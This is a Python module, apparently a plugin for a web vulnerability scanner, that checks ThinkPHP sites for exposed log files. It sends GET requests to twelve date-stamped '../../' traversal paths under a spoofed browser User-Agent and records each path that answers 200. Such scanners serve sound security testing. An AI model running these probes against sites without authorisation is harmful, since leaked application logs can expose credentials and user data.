import os
import time
import requests
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
    }

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_log_find', 
        "Type": None, 
        "Request": None
    }

    # payload 
    filename = time.strftime("%Y%m/%d", time.localtime())
    payload1 = f"../../runtime/log/{filename}.log"
    payload2 = f"../../Home/Temp/log/{filename}.log"
    payload3 = f"../../runtime/index/log/{filename}.log"
    payload4 = f"../../runtime/admin/log/{filename}.log"
    
    filename = time.strftime("%Y_%m_%d", time.localtime())
    payload5 = f"../../Temp/Logs/{filename}.log"
    payload6 = f"../../Runtime/Logs/Home/{filename}.log"
    payload7 = f"../../Runtime/Logs/{filename}.log"
    payload8 = f"../../Runtime/Logs/Common/{filename}.log"
    payload9 = f"../../Application/Runtime/Logs/Common/{filename}.log"
    payload10 = f"../../Application/Runtime/Logs/Home/{filename}.log"
    payload11 = f"../../Application/Runtime/Logs/Admin/{filename}.log"
    payload12 = f"../../App/Runtime/Logs/Home/{filename}.log"

    try:

        for payload in (payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12):
            # print(url + ' ' + payload)
            r = requests.get(url + payload, headers=headers)
            if r.status_code == 200:
                items['Type'] = 'GET'
                items['Request'] = make_request_package(r.request)
                results.append(items.copy())

        if len(results) == 0:
            return False
        return results
    except Exception as e:
        print(e)
        return False
